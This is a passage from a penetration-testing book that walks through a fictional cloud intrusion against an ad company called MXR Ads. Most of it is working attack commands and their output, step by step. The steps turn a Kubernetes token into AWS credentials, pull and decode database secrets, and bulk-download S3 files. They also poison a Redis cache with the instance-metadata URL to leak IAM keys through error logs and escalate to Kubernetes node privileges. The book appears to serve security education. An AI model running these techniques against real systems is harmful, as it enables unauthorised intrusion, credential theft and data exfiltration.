+<span epub:type="pagebreak" title="135" id="Page_135"/><b>--web-identity-token $TOKEN \</b>
+<b>--duration-seconds 43200</b>
+
+{
+    "Credentials": {
+        "SecretAccessKey": "YEqtXSfJb3lHAoRgAERG/I+",
+        "AccessKeyId": "ASIA44ZRK6WSYXMC5YX6",
+        "Expiration": "2019-10-30T19:57:41Z",
+        "SessionToken": "FQoGZXIvYXdzEM3..."
+    },
+<var>--snip--</var>
+}</code></pre>
+
+<p>Hallelujah! We just upgraded our Kubernetes service token to an IAM role capable of interacting with AWS services. What kind of damage can we inflict with this new type of access?</p>
+<h3 id="h2-501263c08-0002">Abusing the IAM Role Privileges</h3>
+<p class="BodyFirst">The api-core application manages campaigns, has links to creatives hosted on S3, and has many further capabilities. It’s safe to assume that the associated IAM role has some extended privileges. Let’s start with an obvious one that has been taunting us since the beginning—listing buckets on S3:</p>
+
+<pre><code>root@Pointer1:/# <b>aws s3api list-buckets</b>
+{
+  "Buckets": [
+     {
+       "Name": "mxrads-terraform",
+       "CreationDate": "2017-10-25T21:26:10.000Z"
+
+       "Name": "mxrads-logs-eu",
+       "CreationDate": "2019-10-27T19:13:12.000Z"
+
+       "Name": "mxrads-db-snapshots",
+       "CreationDate": "2019-10-26T16:12:05.000Z"
+<var>--snip--</var></code></pre>
+
+<p>Finally! After countless tries, we’ve finally managed to land an IAM role that has the <code>ListBuckets</code> permission. That took some time!</p>
+<p>Don’t get too excited just yet, though. We can indeed list buckets, but that says nothing about our ability to retrieve individual files from said buckets. However, by just looking at the buckets list, we gain new insight into MXR Ads’ modus operandi.</p>
+<p>The bucket mxrads-terraform, for instance, most likely stores the state generated by <em>Terraform</em>, a tool used to set up and configure cloud resources such as servers, databases, and network. The state is a declarative description of all the assets generated and managed by Terraform, such as the server’s IP, subnets, IAM role, permissions associated with each role and user, and so on. It even stores cleartext passwords. Even if our target is using a secret management tool like Vault, AWS Key Management Service (KMS), or <span epub:type="pagebreak" title="136" id="Page_136"/>AWS Secrets Manager, Terraform will decrypt them on the fly and store their cleartext version in the state file. Oh, what wouldn’t we give to access that bucket. Let’s give it a try:</p>
+
+<pre><code>root@Point1:~/# <b>aws s3api list-objects-v2 --bucket mxrads-terraform</b>
+
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation:
+Access Denied</code></pre>
+
+<p>Alas, no luck. Everything in good time. Let’s return to our list of buckets.</p>
+<p>There is at least one bucket we are sure api-core should be able to access: s4d.mxrads.com, the bucket storing all the creatives. We’ll use our IAM privileges to list the bucket’s contents:</p>
+
+<pre><code>root@Point1:~/# <b>aws s3api list-objects-v2 --bucket s4d.mxrads.com &gt; list_creatives.txt</b>
+root@Point1:~/# <b>head list_creatives.txt</b>
+{"Contents": [{
+  "Key": "2aed773247f0203d5e672cb/125dad49652436/vid/720/6aa58ec9f77af0c0ca497f90c.mp4",
+
+  "LastModified": "2015-04-08T22:01:48.000Z",
+<var>--snip--</var></code></pre>
+
+<p>Hmm . . . yes, we sure have access to all the videos and images MXR Ads uses in its advertising campaigns, but we’re not going to download and play terabytes of media ads just to find the ones used by Gretsch Politico. There must be a better way to inspect these files.</p>
+<p>And there is. Remember that Kubernetes service account token we retrieved a few minutes ago? We were so hasty in converting it to AWS credentials that we almost forgot the privileges it held on its own. That service account is the golden pass to retrieve cluster resources attributed to the api-core pod. And guess what properties api-core needs to function? Database credentials! We will leverage the DB access to target Gretsch Politico creatives and then use our newly acquired IAM access to download these videos from S3.</p>
+<h3 id="h2-501263c08-0003">Abusing the Service Account Privileges</h3>
+<p class="BodyFirst">We go back to our faithful reverse shell and issue a new <code>curl</code> command to the API server, this time bearing the api-core JWT. We request the secrets found in the pod’s description, <code>dbCorepassword</code>:</p>
+
+<pre><code>shell&gt; <b>export TOKEN="ewJabazetzezet..."</b>
+shell&gt; <b>curl -Lk \</b>
+<b>https://10.100.0.1/api/v1/namespaces/prod/secrets/dbCorepassword \</b>
+<b>--header "Authorization: Bearer $TOKEN"</b>
+{
+    "kind": "Secret",
+    "data": {
+      "user": "YXBpLWNvcmUtcnc=",
+      "password": "ek81akxXbGdyRzdBUzZs" }}</code></pre>
+
+<p><span epub:type="pagebreak" title="137" id="Page_137"/>We then decode the user and password:</p>
+
+<pre><code>root@Point1:~/# <b>echo YXBpLWNvcmUtcnc= |base64 -d</b>
+api-core-rw
+root@Point1:~/# <b>echo ek81akxXbGdyRzdBUzZs |base64 -d</b>
+zO5jLWlgrG7AS6l</code></pre>
+
+<p>And voilà, the campaign database credentials are <code>api-core-rw </code>/<code> zO5jLWlgrG7AS6l</code>.</p>
+<h3 id="h2-501263c08-0004">Infiltrating the Database</h3>
+<p class="BodyFirst">Let’s initiate the connection to the database from the cluster in case the RDS instance is protected by some ingress firewall rules. We don’t know exactly which database backend we will query (RDS supports MySQL, Aurora, Oracle, SQL Server, and more). Because MySQL is the most popular engine, we’ll try that first:</p>
+
+<pre><code>shell&gt; <b>export DBSERVER=984195.cehmrvc73g1g.eu-west-1.rds.amazonaws.com</b>
+
+shell&gt; <b>apt install -y mysql-client</b>
+shell&gt; <b>mysql -h $DBSERVER -u api-core-rw -pzO5jLWlgrG7AS6l -e "Show databases;"</b>
+
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| test               |
+| campaigns          |
+| bigdata            |
+| taxonomy           |
+--snip--</code></pre>
+
+<p>We are in.</p>
+<p>Locating Gretsch Politico’s campaigns requires rudimental SQL knowledge that I won’t go into detail on here. We start by listing every column, table, and database on the server. This information is readily available in the <em>information_schema</em> database in the <code>COLUMN_NAME</code> table:</p>
+
+<pre><code>shell&gt; <b>mysql -h $DBSERVER -u api-core-rw -pzO5jLWlgrG7AS6l -e\</b>
+<b>"select COLUMN_NAME,TABLE_NAME, TABLE_SCHEMA,TABLE_CATALOG from information_schema.columns;"</b>
++----------------------+--------------------+--------------+
+| COLUMN_NAME          | TABLE_NAME         | TABLE_SCHEMA |
++----------------------+--------------------+--------------+
+| counyter             | insertions         | api          |
+| id_entity            | insertions         | api          |
+| max_budget           | insertions         | api          |
+<var>--snip--</var></code></pre>
+
+<p>We cherry-pick the few columns and tables that most likely hold campaign data and then query the information with a couple of <code>select</code> statements <span epub:type="pagebreak" title="138" id="Page_138"/>punctuated by <code>join</code> operations. This should give us the list of campaigns, creative URLs, and budget of each campaign—all the information we could ask for. We make sure to pass in our stolen credentials again:</p>
+
+<pre><code>shell&gt; <b>mysql -h $DBSERVER -u api-core-rw -pzO5jLWlgrG7AS6l campaigns -e\</b>
+<b>"select ee.name, pp.email, pp.hash, ii.creative, ii.counter, ii.max_budget\</b>
+<b>from insertions ii\</b>
+<b>inner join entity ee on ee.id= ii.id_entity\</b>
+<b>inner join profile pp on pp.id_entity= ii.id_entity\</b>
+<b>where ee.name like '%gretsch%'"</b>
+
+---
+Name : Gretsch Politico
+Email: eloise.stinson@gretschpolitico.com
+Hash: c22fe077aaccbc64115ca137fc3a9dcf
+Creative: s4d.mxrads.com/43ed90147211803d546734ea2d0cb/
+12adad49658582436/vid/720/88b4ab3d165c1cf2.mp4
+Counter: 16879
+Maxbudget: 250000
+---
+<var>--snip--</var></code></pre>
+
+<p>It seems GP’s customers are spending hundreds of thousands of dollars on every single one of the 200 ads currently running. That’s some good money all right.</p>
+<p>We loop through all the creative URLs found in the database and retrieve them from S3.</p>
+<p>Remember the time when hackers needed to carefully design exfiltration tools and techniques to bypass data loss prevention measures and painstakingly extract data from the company’s network? Yeah, we don’t need to do that anymore.</p>
+<p>A cloud provider does not care where you are. As long as you have the right credentials, you can download whatever you want. The target will probably get a salty bill at the end of the month, but that will hardly tip off anyone in the accounting department. MXR Ads continuously serves most of these videos worldwide anyway. We are just downloading everything in a single sweep.</p>
+<p>Given the number of creatives involved (a few hundred belonging to GP), we will leverage some <code>xargs</code> magic to parallelize the call to the <code>get-object</code> API. We prepare a file with the list of creatives to fetch and then loop over every line and feed it to <code>xargs</code>:</p>
+
+<pre><code>root@Point1:~/creatives# <b>cat list_creatives.txt | \</b>
+<b>xargs -I @ aws s3api get-object \</b>
+<b>-P 16 \</b>
+<b>--bucket s4d.mxrads.com \</b>
+<b>--key @ \</b>
+<b>$RANDOM</b></code></pre>
+
+<p>The <code>-I</code> flag is the replacement token that determines where to inject the line that was read. The <code>-P</code> flag in <code>xargs</code> is the maximum number of concurrent <span epub:type="pagebreak" title="139" id="Page_139"/>processes (16 on my machine). Finally, <code>RANDOM</code> is a default bash variable that returns a random number on each evaluation and will be the local name of the downloaded creative. Let's see how many creatives we've nabbed:</p>
+<pre><code>root@Point1:~/creatives# <b>ls -l |wc -l</b>
+264</code></pre>
+<p>We get 264 creatives—that’s 264 hate messages, Photoshopped images, doctored videos, and carefully cut scenes emphasizing polarizing messages. Some images even discourage people from voting. Clearly, nothing is out of bounds to get the desired election outcome.</p>
+<p>In getting these video files, we successfully completed goal number 3 from Chapter 4. We still have two crucial objectives to complete: uncovering the real identity of GP’s clients and understanding the extent of the data-profiling activity.</p>
+<p>We go back to our S3 bucket list, hoping to find clues or references to some machine learning or profiling technology (Hadoop, Spark, Flink, Yarn, BigQuery, Jupyter, and so on), but find nothing meaningful we can access.</p>
+<p>How about another component in the delivery chain? We list all the pods running in the <code>prod</code> namespace looking for inspiration:</p>
+
+<pre><code>shell&gt; <b>./kubectl get pods -n prod -o="custom-columns=\</b>
+<b>NODE:.spec.nodeName,\</b>
+<b>POD:.metadata.name"</b>
+
+NODE                         POD
+ip-192-168-133-105.eu-...    vast-check-deployment-d34c-7qxm
+ip-192-168-21-116.eu-...     ads-rtb-deployment-13fe-3evx
+ip-192-168-86-120.eu-...     iab-depl-69dc-0vslf
+ip-192-168-38-101.eu-...     cpm-factor-depl-3dbc-3qozx
+<var>--snip--</var></code></pre>
+
+<p>These pod names are as cryptic as they come. The ad business, not unlike Wall Street, has a nasty habit of hiding behind obscure acronyms that sow doubt and confusion. So, after a couple of hours of research on Wikipedia deciphering these names, we decide to focus on the <code>ads-rtb</code> application. RTB stands for <em>real-time bidding</em>,<em> </em>a protocol used to conduct the auction that leads to the display of a particular ad over all others on a website.</p>
+<p>Every time a user loads a page on a website in partnership with MXR Ads, a piece of JavaScript code fires up a call to MXR Ads’ supply-side platform (SSP) to run an auction. MXR Ads’ SSP relays the request to other SSPs, advertising agencies, or brands to collect their bids. Each agency, acting as a demand-side platform (DSP), bids a certain amount of dollars to display their chosen ad. The amount they’re willing to bid is usually based on multiple criteria: the URL of the website, the position of the ad on the page, the keywords in the page, and, most importantly, the user’s data. If these criteria are suitable to the client running the ad, they’ll bid higher. This auction is conducted automatically using the RTB protocol.</p>
+<p><span epub:type="pagebreak" title="140" id="Page_140"/>It might be the case the RTB pods do not have access to personal data and simply blindly relay requests to servers hosted by GP, but seeing how central the RTB protocol is in the delivery of an ad, these pods may well lead us to our next target.</p>
+<h2 id="h1-501263c08-0004">Redis and Real-Time Bidding</h2>
+<p class="BodyFirst">We pull ads-rtb’s pod manifest:</p>
+
+<pre><code>spec:
+    containers:
+    - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/ads-rtb
+<var>--snip--</var>
+    - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/redis-rtb
+      name: rtb-cache-mem
+      ports:
+      - containerPort: 6379
+        protocol: TCP
+    nodeName: ip-192-168-21-116.eu-west-1.compute.internal
+    hostIP: 192.168.21.116
+    podIP: 10.59.12.47</code></pre>
+
+<p>Look at that! A Redis container is running alongside the RTB application, listening on port 6379.</p>
+<p>As stated previously, I have yet to see a Redis database protected with authentication in an internal network, so you can imagine that our Redis hiding inside a pod in a Kubernetes cluster obviously welcomes us with open arms. We download the Redis client and proceed to list the keys saved in the database:</p>
+
+<pre><code>shell&gt; <b>apt install redis-tools</b>
+
+shell&gt; <b>redis -h 10.59.12.47 --scan * &gt; all_redis_keys.txt</b>
+
+shell&gt; <b>head -100 all_redis_keys.txt</b>
+vast_c88b4ab3d_19devear
+select_3799ec543582b38c
+vast_5d3d7ab8d4
+<var>--snip--</var></code></pre>
+
+<p>Each RTB application is shipped with its own companion Redis container that acts as a local cache to store various objects. The key <code>select_3799ec543582b38c</code> holds a literal Java object serialized into bytes. We can tell this because any Java serialized object has the hex string marker 00 05 73 72, which we see when we query the key’s value:</p>
+
+<pre><code>shell&gt; <b>redis -h 10.59.12.47 get select_3799ec543582b38c</b>
+
+AAVzcgA6Y29tLm14cmFkcy5ydGIuUmVzdWx0U2V0JEJpZFJlcXVlc3SzvY...
+
+<span epub:type="pagebreak" title="141" id="Page_141"/>shell&gt; <b>echo -ne AAVzcgA6Y29tLm14cmFkcy5ydGI...| base64 -d | xxd</b>
+
+aced <b>0005 7372</b> 003a 636f 6d2e 6d78 7261  ......sr.:com.mxra
+6473 2e72 7462 2e52 6573 756c 7453 6574  ds.rtb.ResultSet$B
+2442 6964 5265 7175 6573 74b3 bd8d d306  $BidRequest.......
+091f ef02 003d dd...</code></pre>
+
+<p>Instead of retrieving the same result time and time again from the database and needlessly incurring the expensive cost of network latency, the ads-rtb container keeps previous database results (strings, objects, and so forth) in its local Redis container cache. Should the same request present itself later, it fetches the corresponding result almost instantly from Redis.</p>
+<p>This form of caching was probably hailed as a fantastic idea during the initial application design, but it involves a dangerous and often overlooked operation: deserialization.</p>
+<h3 id="h2-501263c08-0005">Deserialization</h3>
+<p class="BodyFirst">When a Java object (or object from almost any high-level language for that matter, like Python, C#, and so forth) is deserialized, it is transformed back from a stream of bytes into a series of attributes that populate a real Java object. This process is usually carried out by the <code>readObject</code> method of the target class.</p>
+<p>Here’s a quick example showing what might be going on inside ads-rtb. Somewhere in the code, the application loads an array of bytes from the Redis cache and initializes an input stream:</p>
+
+<pre><code>// Retrieve serialized object from Redis
+byte[] data = FetchDataFromRedis()
+// Create an input stream
+ByteArrayInputStream bis = new ByteArrayInputStream(data);</code></pre>
+
+<p>Next, this series of bytes is consumed by the <code>ObjectInputStream</code> class, which implements the <code>readObject</code> method. This method extracts the class, its signature, and static and nonstatic attributes, effectively transforming a series of bytes into a real Java object:</p>
+
+<pre><code>// Create a generic Java object from the stream
+ObjectInputStream ois = new ObjectInputStream(bis);
+
+// Calling readObject of the bidRequest class to format/prepare the raw data
+BidRequest objectFromRedis = <span class="CodeAnnotation" aria-label="annotation1">1</span>(BidRequest)ois.readObject();</code></pre>
+
+<p>Here’s where we may find an in. We did not call the default <code>readObject</code> method of the <code>ObjectInputStream</code> but instead called a custom <code>readObject</code> method defined in the target class <code>BidRequest</code><span class="CodeAnnotation" aria-label="annotation1">1</span>.</p>
+<p>This custom <code>readObject</code> method can pretty much do anything with the data it receives. In this next boring scenario, it just lowers the case of an <span epub:type="pagebreak" title="142" id="Page_142"/>attribute called <code>auctionID</code>, but anything is possible: it could perform network calls, read files, and even execute system commands. And it does so based on the input it got from the untrusted serialized object:</p>
+
+<pre><code>// BidRequest is a class that can be serialized
+class BidRequest implements Serializable{
+    public String auctionID;
+    private void readObject(java.io.ObjectInputStream in){
+       in.defaultReadObject();
+       this.auctionID = this.auctionID.toLowerCase();
+       // Perform more operations on the object attributes
+    }
+}</code></pre>
+
+<p>Thus, the challenge is to craft a serialized object that contains the right values and navigates the execution flow of a <code>readObject</code> method until it reaches a system command execution or other interesting outcome. It might seem like a long shot, but that’s exactly what a couple of researchers did a couple of years back. The only difference is that they found this flaw in the <code>readObject</code> method of a class inside commons-collections, a Java library shipped by default in the Java Runtime Environment (check out the talk “Exploiting Deserialization Vulnerabilities in Java” by Matthias Kaiser).</p>
+<p>During a brief moment after this talk, deserialization vulnerabilities almost rivaled Windows exploits in quantity. It was uncanny! The <code>readObject</code> method of the faulty classes was patched in newer versions of the commons-collections library (starting from 3.2.2), but since tuning the Java Virtual Machine (JVM) is such a hazardous process more often than not, based on folklore and ancient wisdom, many companies resist the urge to upgrade JVMs, thus leaving the door wide open for deserialization vulnerabilities.</p>
+<p>First, we need to make sure that our pod is vulnerable to this attack.</p>
+<p>If you remember, in Chapter 5 we came across the bucket mxrads-dl that seemed to act as a private repository of public JAR files and binaries. This bucket should contain almost every version of external JAR files used by apps like ads-rtb. The answer, therefore, may lie in there. We search through the bucket’s key for vulnerable Java libraries supported by the ysoserial tool (<a href="https://github.com/frohoff/ysoserial/" class="LinkURL">https://github.com/frohoff/ysoserial/</a>), which is used to craft payloads triggering deserialization vulnerabilities in many Java classes. The tool’s GitHub page lists a number of well-known libraries that can be exploited, such as commons-collections 3.1, spring-core 4.1.4, and so on.</p>
+
+<pre><code>root@Point1:~/# <b>aws s3api list-objects-v2 --bucket mxrads-dl &gt; list_objects_dl.txt</b>
+root@Point1:~/# <b>grep 'commons-collections' list_objects_dl.txt</b>
+
+Key: jar/maven/artifact/org.apache.commons-collections/commons-collections/3.3.2
+<var>--snip--</var></code></pre>
+
+<p>We find commons-collections version 3.3.2. So close. We could venture a blind exploit hoping the bucket still uses a local, old version of the commons-collections library, but the odds are stacked against us, so we’ll move on.</p>
+<h3 id="h2-501263c08-0006"><span epub:type="pagebreak" title="143" id="Page_143"/>Cache Poisoning</h3>
+<p class="BodyFirst">We continue exploring other keys in the Redis cache, hoping for some new inspiration:</p>
+
+<pre><code>shell&gt; <b>head -100 all_redis_keys.txt</b>
+vast_c88b4ab3d_19devear
+select_3799ec543582b38c
+<code>vast_c88b4ab3d_19devear</code>
+<var>--snip--</var></code></pre>
+
+<p>We list the contents of the key <code>vast_c88b4ab3d_19devear</code> and find a URL this time:</p>
+
+<pre><code>shell&gt; <b>redis -h 10.59.12.47 get vast_c88b4ab3d_19devear</b>
+https://www.goodadsby.com/vast/preview/9612353</code></pre>
+
+<p>VAST (Video Ad Serving Template) is a standard XML template for describing ads to browser video players, including where to download the media, which tracking events to send, after how many seconds, to which endpoint, and so on. Here is an example of a VAST file pointing to a video file stored on <em>s4d.mxards.com</em> for an ad titled “Exotic Approach”:</p>
+
+<pre><code>&lt;VAST version="3.0"&gt;
+&lt;Ad id="1594"&gt;
+  &lt;InLine&gt;
+    &lt;AdSystem&gt;MXR Ads revolution&lt;/AdSystem&gt;
+    &lt;AdTitle&gt;Exotic approach&lt;/AdTitle&gt;
+<var>--snip--</var>
+    &lt;MediaFile id="134130" type="video/mp4" 
+        bitrate="626" width="1280" height="720"&gt;
+       http://s4d.mxrads.com/43ed9014730cb/12ad82436/vid/720/88b4a1cf2.mp4
+<var>--snip--</var></code></pre>
+
+<p>XML parsers can be such fickle beasts—the wrong tag, and all hell breaks loose. The parser will spit out stack traces bigger than the original file itself into the standard error output. So many exceptions that need to be properly handled . . . and logged!</p>
+<p>See where I’m going with this? We already have access to the pods handling the application logs related to ad delivery. If we replace a VAST URL with, say, the metadata API URL that responds with a JSON/text format, will the application send a verbose error to the Elasticsearch audit store that we can look at?</p>
+<p>Only one way to find out. We replace a dozen valid VAST URLs with the infamous endpoint URL <code>http://169.254.169.254/latest/meta-data/iam/info</code>, like so:</p>
+
+<pre><code>shell&gt; <b>redis -h 10.59.12.47 set vast_c88b4ab3d_19devear\</b>
+<b>http://169.254.169.254/latest/meta-data/iam/info</b>
+OK</code></pre>
+
+<p><span epub:type="pagebreak" title="144" id="Page_144"/>This metadata endpoint should return a JSON response containing the IAM role attached to the node running the ads-rtb pod. We know the role exists because EKS requires it. Bonus point: this role has some interesting privileges.</p>
+<p>It takes a good 10 minutes for one of the poisoned cache entries to be triggered, but we finally get the verbose error we were hoping for. We can locate the error in the log index by searching for MXR Ads’ AWS account ID, 886371554408:</p>
+
+<pre><code>shell&gt; <b>curl "10.20.86.24:9200/log/_search?pretty&amp;size=10&amp;q=message: 886371554408"</b>
+
+"level": "Critical"
+"message": "...\"InstanceProfileArn\" : 
+\" arn:aws:iam::886477354405:instance-profile/eks-workers-prod-common-NodeInstanceProfile-
+BZUD6DGQKFGC\"...org.xml.sax.SAXParseException...Not valid XML file"</code></pre>
+
+<p>The pod that triggered the query is running with the IAM role <code>eks-workers-prod-common-NodeInstanceProfile-BZUD6DGQKFGC</code>. All we have to do now is poison the Redis cache once more, but this time append the role name to the URL to fetch its temporary access keys:</p>
+
+<pre><code>shell&gt; <b>redis -h 10.59.12.47 set vast_c88b4ab3d_19devear\</b>
+<b>http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-workers-prod-common-NodeInstanceRole-BZUD6DGQKFGC</b>
+OK</code></pre>
+
+<p>A few minutes later we get our coveted prize, valid AWS access keys with EKS node privileges in the log index:</p>
+
+<pre><code>shell&gt; <b>curl "10.20.86.24:9200/log/_search?pretty&amp;size=10&amp;q=message: AccessKeyId"</b>
+
+"level": "Critical"
+"message": "...\"AccessKeyId\" : \"ASIA44ZRK6WS3R64ZPDI\", \"SecretAccessKey\" :
+\"+EplZs...org.xml.sax.SAXParseException...Not valid XML file"</code></pre>
+
+<p>According to the AWS docs, the default role attached to a Kubernetes node will have basic permissions over EC2 to discover its environment: <code>describe-instances</code>, <code>describe-security-groups</code>, <code>describe-volumes</code>, <code>describe-subnets</code>, and so on. Let’s give these new credentials a spin and list all instances in the <code>eu-west-1</code> region (Ireland):</p>
+
+<pre><code>root@Point1:~/# <b>vi ~/.aws/credentials</b>
+[node]
+aws_access_key_id = ASIA44ZRK6WS3R64ZPDI
+aws_secret_access_key = +EplZsWmW/5r/+B/+J5PrsmBZaNXyKKJ
+aws_session_token = AgoJb3JpZ2luX2...
+
+root@Point1:~/# <b>aws ec2 describe-instances \</b>
+<b>--region=eu-west-1 \</b>
+<b>--profile node</b>
+<var>--snip--</var>
+<span epub:type="pagebreak" title="145" id="Page_145"/>"InstanceId": "i-08072939411515dac",
+"InstanceType": "c5.4xlarge",
+"KeyName": "kube-node-key",
+"LaunchTime": "2019-09-18T19:47:31.000Z",
+"PrivateDnsName": "ip-192-168-12-33.eu-west-1.compute.internal",
+"PrivateIpAddress": "192.168.12.33",
+"PublicIpAddress": "34.245.211.33",
+"StateTransitionReason": "",
+"SubnetId": "subnet-00580e48",
+"Tags": [
+  {
+  "Key": "k8s.io/cluster-autoscaler/prod-euw1",
+  "Value": "true"
+  }],
+<var>--snip--</var></code></pre>
+
+<p>Things are looking great. We get the full descriptions of approximately 700 EC2 machines, including private and public IP addresses, firewall rules, machine types, and more. That’s a lot of machines, but the figure is relatively small for a company with the scale of MXR Ads. Something is off.</p>
+<p>All the machines we got have the special tag <code>k8s.io/cluster-autoscaler/prod-euw1</code>. This is a common tag used by the autoscaler tool (<a href="https://github.com/kubernetes/autoscaler/" class="LinkURL">https://github.com/kubernetes/autoscaler/</a>) to mark disposable nodes that can be killed off when the pods’ activity is running low. MXR Ads probably took advantage of this tag to limit the scope of the default permissions assigned to Kubernetes nodes. Clever indeed.</p>
+<p>Ironically, the tag spills out the Kubernetes cluster name <code>(prod-euw1)</code>, which is a required parameter in a call to the <code>describeCluster</code> API. Let’s call <code>describeCluster</code> then:</p>
+
+<pre><code>root@Point1:~/# <b>export AWS_REGION=eu-west-1</b>
+root@Point1:~/# <b>aws eks describe-cluster --name prod-euw1 --profile node</b>
+{  "cluster": {
+  <span class="CodeAnnotation" aria-label="annotation1">1</span> "endpoint": "https://BB061F0457C63.yl4.eu-west-1.eks.amazonaws.com",
+  <span class="CodeAnnotation" aria-label="annotation2">2</span> "roleArn": "arn:aws:iam::886477354405:role/eks-prod-role",
+    "vpcId": "vpc-05c5909e232012771",
+    "endpointPublicAccess": false,
+    "endpointPrivateAccess": true,
+<var>--snip--</var></code></pre>
+
+<p>The API server is that long URL conveniently named <code>endpoint</code> <span class="CodeAnnotation" aria-label="annotation1">1</span>. In some rare configurations, it may be exposed on the internet, making it much more convenient to query/alter the cluster’s desired state.</p>
+<p>The role we got <span class="CodeAnnotation" aria-label="annotation2">2</span> can do much more than simply explore Kubernetes resources. In a default setting, this role has the power to attach any security group to any other node in the cluster. Now that we’ve been granted this role, we just need to find an existing security group that exposes every port on the internet—there is always one—and assign it to the machine hosting our current shell.</p>
+<p>Not so fast, though. While it might be tempting to promote our handcrafted S3-based reverse shell into a full-blown duplex communication <span epub:type="pagebreak" title="146" id="Page_146"/>channel, it is very probable that MXR Ads Terraformed their Kube cluster by declaring how many machines should ideally be running, what their network configuration should look like, and which security groups are assigned to each machine. If we alter these parameters, the change will be flagged on the next <code>terraform plan</code> command. A security group that allows all ingress traffic to a random node can only raise questions we’d rather avoid.</p>
+<p>We continue to toy around with the role attached to the Kube node, but it quickly hits its limits. It was so severely restricted that it lost every ounce of interest. We can only describe general information about the cluster’s components. We don’t have access to the machines’ user data and can hardly change anything without sounding the whistle.</p>
+<p>Come to think of it, why are we only considering this node as an AWS resource? It is first and foremost a Kubernetes resource. A privileged one at that. This node may have laughable permissions in the AWS environment, but it is a supreme god in the Kubernetes world as it literally has life and death authority over the pods in its realm.</p>
+<p>As explained earlier, every node has a running process called the kubelet that polls the API server for new pods to spawn or terminate. Running containers means mounting volumes, injecting secrets . . . how the hell does it achieve this level of access?</p>
+<p>Answer: via the node’s instance profile—aka the role we were playing with this whole time.</p>
+<p>When you set up a Kubernetes cluster on EKS, one of the first configurations to apply before even starting the nodes is to add the node IAM role name to the <code>system:nodes</code> group. This group is bound to the Kubernetes role <code>system:node</code>, which has read permissions on various Kube objects: services, nodes, pods, persistent volumes, and 18 other resources!</p>
+<p>All we have to do to inherit these powers is ask AWS to morph our IAM access keys into a valid Kubernetes token so we can query the API server as a valid member of the <code>system:nodes</code> group. To do this we call the <code>get-token</code> API:</p>
+
+<pre><code>root@Point1:~/# <b>aws eks get-token --cluster-name prod-euw1 --profile node</b>
+{
+    "kind": "ExecCredential",
+    "apiVersion": "client.authentication.k8s.io/v1alpha1",
+    "status": {
+        "expirationTimestamp": "2019-11-14T21:04:23Z",
+        "token": "k8s-aws-v1.aHR0cHM6Ly9zdHMuYW1hem..."
+    }
+}</code></pre>
+
+<p>The token we get this time is not a standard JWT; rather, it contains the building blocks of a call to the <code>GetCallerIdentity</code> API of the STS service. Let’s decode a portion of the token we obtained earlier using a combination of <code>jq</code>, <code>cut</code>, <code>base64</code>, and <code>sed</code>:</p>
+
+<pre><code>root@Point1:~/# <b>aws eks get-token --cluster-name prod-euw1 \</b>
+<b>| jq -r .status.token \</b>
+<span epub:type="pagebreak" title="147" id="Page_147"/><b>| cut -d"_" -f2 \</b>
+<b>| base64 -d \</b>
+<b>| sed "s/&amp;/\n/g"</b>
+
+https://sts.amazonaws.com/?Action=GetCallerIdentity
+&amp;Version=2011-06-15
+&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256
+&amp;X-Amz-Credential=ASIA44ZRK6WSYQ5EI4NS%2F20191118/us-east-1/sts/aws4_request
+&amp;X-Amz-Date=20191118T204239Z
+&amp;X-Amz-Expires=60
+&amp;X-Amz-SignedHeaders=host;x-k8s-aws-id
+&amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX/////...</code></pre>
+
+<p>The JWT is actually an encoded pre-signed URL that bears the node’s identity. Anyone can replay this URL to verify that the node is indeed who it claims to be. That’s exactly what EKS does upon receiving this token. Just as AWS IAM trusts OpenID to identify and authenticate Kube users (through the means of a JWT), EKS trusts IAM to do the same through a web call to the <code>sts.amazon.com</code> endpoint.</p>
+<p>We can use this token in a <code>curl</code> command to the API server like we did earlier, but we are better off generating a full Kubectl config that we can download into that trustworthy pod of ours:</p>
+
+<pre><code>root@Point1:~/# <b>aws eks update-kubeconfig --name prod-euw1 --profile node</b>
+
+Updated context arn:aws:eks:eu-west-1:886477354405:cluster/prod-euw1 in /root/.kube/config
+shell&gt; <b>wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/config</b>
+
+shell&gt; <b>mkdir -p /root/.kube &amp;&amp; cp config /root/.kube/</b></code></pre>
+
+<p>A quick way to test whether we’ve gained our new privileges is to list the pods in the sacred <code>kube-system</code> namespace. This is the namespace that contains the master pods—the kube api-server, etcd, coredns—and other critical pods used to administer Kubernetes. Remember that our previous tokens were limited to the <code>prod</code> namespace, so gaining access to <code>kube-system</code> would be a huge step forward:</p>
+
+<pre><code>shell&gt; <b>kubectl get pods -n kube-system</b>
+
+NAME                       READY   STATUS    RESTARTS   AGE
+aws-node-hl227             1/1     Running   0          82m
+aws-node-v7hrc             1/1     Running   0          83m
+coredns-759d6fc95f-6z97w   1/1     Running   0          89m
+coredns-759d6fc95f-ntq88   1/1     Running   0          89m
+kube-proxy-724jd           1/1     Running   0          83m
+kube-proxy-qtc22           1/1     Running   0          82m
+<var>--snip--</var></code></pre>
+
+<p>We manage to list the pods! Nice! Obviously, since we are in a managed Kubernetes, the most vital pods (kube-apiserver, etcd, kube-controller-manager) are kept hidden by Amazon, but the rest of the pods are there.</p>
+<h3 id="h2-501263c08-0007"><span epub:type="pagebreak" title="148" id="Page_148"/>Kube Privilege Escalation</h3>
+<p class="BodyFirst">Let’s put our new privileges to good use. The first thing we want to do is grab all the secrets defined in Kube; however, when we try it, we find that even though the <code>system:nodes</code> group technically has the permission to do so, it cannot arbitrarily request secrets:</p>
+
+<pre><code>shell&gt; <b>kubectl get secrets --all-namespaces</b>
+
+Error from server (Forbidden): secrets is forbidden:
+User "system:node:ip-192-168-98-157.eu-west-1.compute.internal" cannot list
+resource "secrets" in API group "" at the cluster scope: can only read
+namespaced object of this type</code></pre>
+
+<p>A security feature introduced in Kubernetes version 1.10 limits the excessive power attributed to nodes: node authorization. This feature sits on top of classic role-based access control. A node can only exercise its ability to retrieve a secret if there are scheduled pods on that same node that need that secret. When those pods are terminated, the node loses access to the secret.</p>
